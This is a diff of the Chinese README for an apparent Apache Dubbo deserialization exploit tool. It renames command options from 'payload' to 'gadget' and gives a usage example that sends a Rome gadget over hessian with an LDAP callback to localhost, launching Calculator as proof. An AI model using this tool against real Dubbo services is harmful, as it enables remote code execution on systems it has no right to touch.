@@ -5,26 +5,26 @@
 ## 使用帮助
 
 usage: java -jar exp.jar [OPTION]
-- -h                帮助信息
-- -list             输出所有payload信息
-- -p <arg>          payload名称
-- -param <arg>      payload入参
-- -protocol <arg>   [dubbo|http] 通讯协议名称，默认缺省dubbo
-- -s <arg>          [hessian|java] 序列化类型，默认缺省hessian
-- -t <arg>          目标，例：127.0.0.1:20880
+- -h --help               帮助信息
+- -l --list             输出所有gadget信息
+- -g --gadget <arg>          gadget名称
+- -a --args <arg>      gadget入参，多个参数使用多次该命令传入，例-a http://127.0.0.1:80/ -a Calc
+- -p --protocol <arg>   [dubbo|http] 通讯协议名称，默认缺省dubbo
+- -s --serialization <arg>          [hessian|java] 序列化类型，默认缺省hessian
+- -t --target <arg>          目标，例：127.0.0.1:20880
 
 例（测试dubbo默认缺省情况下使用的dubbo协议+hessian2反序列化）：
 ```
 java -jar dubbo-exp.jar
--t
+--target
 127.0.0.1:20881
--protocol
+--protocol
 dubbo
--s
+--serialization
 hessian
--p
+--gadget
 rome
--param
+--args
 ldap://127.0.0.1:43658/Calc
 ```
 
@@ -42,7 +42,7 @@ CommonsCollections8
 /System/Applications/Calculator.app/Contents/MacOS/Calculator
 ```
 
-## payloads列表
+## gadget列表
 
 ---------------------------------------------------------------------------------------------------------
 1. 名称：resin
